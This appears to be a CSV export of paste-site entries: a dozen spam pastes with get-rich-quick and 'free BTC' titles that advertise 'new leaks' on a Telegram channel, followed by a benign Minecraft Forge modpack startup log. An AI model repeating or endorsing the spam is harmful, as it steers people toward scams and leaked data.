id,title,username,language,date,content
K0GNXWcg,FREE BTC GUIDE Q,backyardbrew,JavaScript,Sunday 20th of July 2025 01:06:17 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/PAZZHits

 1447187

"
tUXxyDZQ,MAKE $5000 INSTANTLY J,backyardbrew,JavaScript,Sunday 20th of July 2025 01:05:32 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/PAZZHits

 6871122

"
8Ps53Ekq,✅ MAKE $22OO IN 10 MIN A,backyardbrew,JavaScript,Sunday 20th of July 2025 01:04:24 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/PAZZHits

 8292234

"
vfMwhVcv,Make 3500$ in 20 MIN [Method] Y,backyardbrew,JavaScript,Sunday 20th of July 2025 01:03:43 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/PAZZHits

 2942049

"
tpKNbNfU,Make 3500$ in 20 MIN [Method] Y,backyardbrew,JavaScript,Sunday 20th of July 2025 01:02:45 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/PAZZHits

 3125898

"
ZRgPEHTn,Make $2500 in 15 minutes N,backyardbrew,JavaScript,Sunday 20th of July 2025 01:02:09 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/PAZZHits

 1363700

"
QKmFTncT,Make $2500 in 15 minutes N,backyardbrew,JavaScript,Sunday 20th of July 2025 01:00:33 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/PAZZHits

 6982348

"
Jy99C8qN,✅ MAKE $22OO IN 10 MIN A,backyardbrew,JavaScript,Sunday 20th of July 2025 12:59:54 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/PAZZHits

 7537703

"
v6yY0JsG,Make 3500$ in 20 MIN [Method] Y,backyardbrew,JavaScript,Sunday 20th of July 2025 12:59:17 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/PAZZHits

 7643609

"
K9qNcMmx,Make $2500 in 15 minutes N,backyardbrew,JavaScript,Sunday 20th of July 2025 12:58:42 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/PAZZHits

 5441422

"
NJNer3Qz,FREE BTC GUIDE Q,backyardbrew,JavaScript,Sunday 20th of July 2025 12:58:03 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/PAZZHits

 8637348

"
nk8R9YkV,Make $2500 in 15 minutes N,backyardbrew,JavaScript,Sunday 20th of July 2025 12:57:21 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/PAZZHits

 8748522

"
pBUL1ZFa,Untitled,NikaraWorld,Java,Sunday 20th of July 2025 12:31:24 AM CDT,"[01:23:35] [main/INFO]: ModLauncher running: args [--username, AnimalLover6866, --version, forge-47.4.4, --gameDir, E:\Curseforge\Instances\Create'a Colony (1), --assetsDir, E:\Curseforge\Install\assets, --assetIndex, 5, --uuid, b3177828bf0c4d858c046932df2c7e0c, --accessToken, ????????, --clientId, YWY4MGRmMTgtN2IzYy00MzJlLWJhODctYjI3ZDI1NGE0YTY2, --xuid, 2533274960657592, --userType, msa, --versionType, release, --width, 1024, --height, 768, --launchTarget, forgeclient, --fml.forgeVersion, 47.4.4, --fml.mcVersion, 1.20.1, --fml.forgeGroup, net.minecraftforge, --fml.mcpVersion, 20230612.114412]
[01:23:35] [main/INFO]: ModLauncher 10.0.9+10.0.9+main.dcd20f30 starting: java version 17.0.15 by Microsoft; OS Windows 10 arch amd64 version 10.0
[01:23:36] [main/INFO]: Loading ImmediateWindowProvider fmlearlywindow
[01:23:36] [main/INFO]: Trying GL version 4.6
[01:23:36] [main/INFO]: Requested GL version 4.6 got version 4.6
[01:23:36] [main/INFO]: Mixin Transmogrifier is definitely up to no good...
[01:23:37] [main/INFO]: crimes against java were committed
[01:23:37] [main/INFO]: Original mixin transformation service successfully crobbed by mixin-transmogrifier!
[01:23:37] [main/INFO]: SpongePowered MIXIN Subsystem Version=0.8.5 Source=union:/E:/Curseforge/Instances/Create'a%20Colony%20(1)/mods/Connector-1.0.0-beta.46+1.20.1.jar%23316%23319!/ Service=ModLauncher Env=CLIENT
[01:23:37] [pool-2-thread-1/INFO]: GL info: NVIDIA GeForce RTX 2080 Ti/PCIe/SSE2 GL version 4.6.0 NVIDIA 572.16, NVIDIA Corporation
[01:23:37] [main/INFO]: Found mod file Connector-1.0.0-beta.46+1.20.1-mod.jar of type MOD with provider org.sinytra.connector.locator.ConnectorEarlyLocator@22bd2039
[01:23:37] [main/INFO]: Found mod file AmbientSounds_FORGE_v6.1.1_mc1.20.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file appleskin-forge-mc1.20.1-2.5.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file appliedenergistics2-forge-15.2.8.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file architectury-9.2.14-forge.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file athena-forge-1.20.1-3.1.2.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file AttributeFix-Forge-1.20.1-21.0.4.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file balm-forge-1.20.1-7.3.33-all.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file betterfpsdist-1.20.1-6.0.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file bettervillage-forge-1.20.1-3.2.0.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file BiomesOPlenty-1.20.1-18.0.0.592.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file blockui-1.20.1-1.0.151-BETA.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file bobberdetector-0.1.9-1.20.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file Bookshelf-Forge-1.20.1-20.1.9.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file Byzantine-1.20.1-11.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file capes-1.5.2+1.20-forge.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file carryon-forge-1.20.1-2.1.2.7.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file cbc_at_1.20.1_alpha_001.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file cbcmodernwarfare-0.0.6c+mc.1.20.1-forge.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file Chipped-forge-1.20.1-3.0.4.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file chunkloaders-1.2.8a-forge-mc1.20.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file chunksending-1.20.1-2.8.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file citadel-2.5.4-1.20.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file ClayBrickRecipeRework-mc1.20.1-1.0.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file cleanswing-1.20-1.5.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file clockwork-1.20.1-0.1.16-forge-b3b22e39fe.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file cloth-config-11.1.118-forge.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file Clumps-forge-1.20.1-12.0.0.4.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file collective-1.20.1-7.40.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file comforts-forge-6.3.5+1.20.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file connectivity-1.20.1-7.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file constructionwand-1.20.1-2.11.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file Controlling-forge-1.20.1-12.0.2.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file copycats-2.2.0+mc.1.20.1-forge.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file corn_delight-1.0.4-1.20.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file corpse-forge-1.20.1-1.0.12.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file craftingtweaks-forge-1.20.1-18.2.3.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file CraftTweaker-forge-1.20.1-14.0.38.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file create-1.20.1-0.5.1.j.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file create-confectionery1.20.1_v1.1.0.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file create-stuff-additions1.20.1_v2.0.4a.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file create_central_kitchen-1.20.1-for-create-0.5.1.f-1.3.12.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file create_connected-0.9.4-mc1.20.1-all.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file create_enchantment_industry-1.20.1-for-create-0.5.1.f-1.2.9.d.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file create_eureka-1.0.0+forge-1.20.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file create_radar-0.1.56mc1.20.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file create_recipes-1.2.0.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file create_recycle_1.0.2_forge_1.20.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file create_the_air_wars-1.04-forge-1.20.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file create_tweaked_controllers-1.20.1-1.2.4.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file createaddition-1.20.1-1.2.4e.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file createappliedkinetics-1.3.2-1.20.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file createbigcannons-5.8.2-mc.1.20.1-forge.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file createdeco-2.0.2-1.20.1-forge.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file createendertransmission-2.0.7-1.20.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file createliquidfuel-2.1.1-1.20.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file createloveandwar-0.1-1.20.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file CreateTweaker-forge-1.20.1-4.0.9.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file CreativeCore_FORGE_v2.12.17_mc1.20.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file cupboard-1.20.1-2.6.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file curios-forge-5.9.1+1.20.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file domum_ornamentum-1.20.1-1.0.184-BETA-universal.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file drivebywire-1.20.1-0.0.10.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file EffectTooltips-Forge-1.20.1-9.0.2.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file effortlessbuilding-1.20.1-3.7-all.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file embeddium-0.3.31+mc1.20.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file EnchantmentDescriptions-Forge-1.20.1-17.1.18.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file entityculling-forge-1.7.0-mc1.20.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file eureka-1201-1.5.1-beta.3.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file fabric-api-0.92.2+1.11.12+1.20.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file Fallingleaves-1.20.1-2.1.0.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file FarmersDelight-1.20.1-1.2.4.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file ferritecore-6.0.1-forge.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file flansmod-1.20.1-0.2.147.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file foodeffecttooltips+forge-1.20.1-1.3.0.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file FramedBlocks-9.3.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file framework-forge-1.20.1-0.7.6.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file freecam-forge-1.2.1+1.20.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file fusion-1.2.8a-forge-mc1.20.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file fzzy_config-0.5.1+1.20.1+forge.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file gamemenumodoption-mc1.20.1-2.2.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file geckolib-forge-1.20.1-4.4.4.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file gpumemleakfix-1.20.1-1.8.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file ImmediatelyFast-Forge-1.2.10+1.20.4.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file immersive_paintings-0.6.7+1.20.1-forge.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file inventorysorter-1.20.1-23.0.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file Jade-1.20.1-forge-11.7.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file JadeAddons-1.20.1-forge-5.2.2.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file jei-1.20.1-forge-15.3.0.4.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file JustEnoughProfessions-forge-1.20.1-3.0.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file JustEnoughResources-1.20.1-1.4.0.247.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file justzoom_forge_1.0.2_MC_1.20.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file Kambrik-6.1.1+1.20.1-forge.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file konkrete_forge_1.8.0_MC_1.20-1.20.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file kotlinforforge-4.11.0-all.jar of type LIBRARY with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file letmedespawn-forge-1.20.x-1.2.0.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file letsdo-API-forge-1.2.15-forge.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file libraryferret-forge-1.20.1-4.0.0.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file lightmanscurrency-1.20.1-2.2.5.4.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file mcjtylib-1.20-8.0.5.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file mcw-bridges-3.0.0-mc1.20.1forge.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file mcw-doors-1.1.1forge-mc1.20.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file mcw-fences-1.1.2-mc1.20.1forge.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file mcw-trapdoors-1.1.3-mc1.20.1forge.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file minecolonies-1.20.1-1.1.828-snapshot.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file modernfix-forge-5.14.0+mc1.20.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file molten_metals-1.20.1-0.1.4-forge.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file molten_vents-1.20.1-2.0.8.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file moonlight-1.20-2.12.6-forge.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file MouseTweaks-forge-mc1.20.1-2.25.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file multipiston-1.20-1.2.43-RELEASE.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file mysterious_mountain_lib-1.4.5-1.20.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file NaturesCompass-1.20.1-1.11.2-forge.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file neruina-1.3.0-forge+1.18.2-1.20.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file oculus-flywheel-compat-1.20.1-0.2.2.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file oculus-mc1.20.1-1.8.0.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file polymorph-forge-0.49.2+1.20.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file PuzzlesLib-v8.1.17-1.20.1-Forge.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file RealisticExplosionPhysics-1.20.1-1.0.0.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file rechiseled-1.1.5c-forge-mc1.20.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file rechiseledcreate-1.0.2-forge-mc1.20.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file recipeessentials-1.20.1-3.2.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file resourcefullib-forge-1.20.1-2.1.23.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file right-click-harvest-3.2.3+1.20.1-forge.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file s_a_b-1.4.2.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file Searchables-forge-1.20.1-1.0.2.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file simpleclouds-0.6.3+1.20.1-forge-all.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file skinlayers3d-forge-1.7.0-mc1.20.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file sliceanddice-forge-3.3.0.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file smoothchunk-1.20.1-3.6.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file sodiumdynamiclights-forge-1.0.10-1.20.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file sodiumextras-forge-1.0.7-1.20.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file sodiumoptionsapi-forge-1.0.10-1.20.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file soundphysics-forge-1.20.1-1.1.2.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file Splashy-Forge-1.20.1-14.0.4.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file starlight-1.1.2+forge.1cda73c.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file Steam_Rails-1.6.6+forge-mc1.20.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file storagedrawers-1.20.1-12.0.3.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file structureessentials-1.20.1-3.3.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file structurize-1.20.1-1.0.759-snapshot.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file stylecolonies-1.12-1.20.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file supermartijn642configlib-1.1.8-forge-mc1.20.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file supermartijn642corelib-1.1.17-forge-mc1.20.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file tectonic-forge-1.19.3-2.3.4.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file TerraBlender-forge-1.20.1-3.0.1.4.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file Terralith_1.20.4_v2.4.11.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file tfmg-0.9.3-1.20.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file torchmaster-20.1.8.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
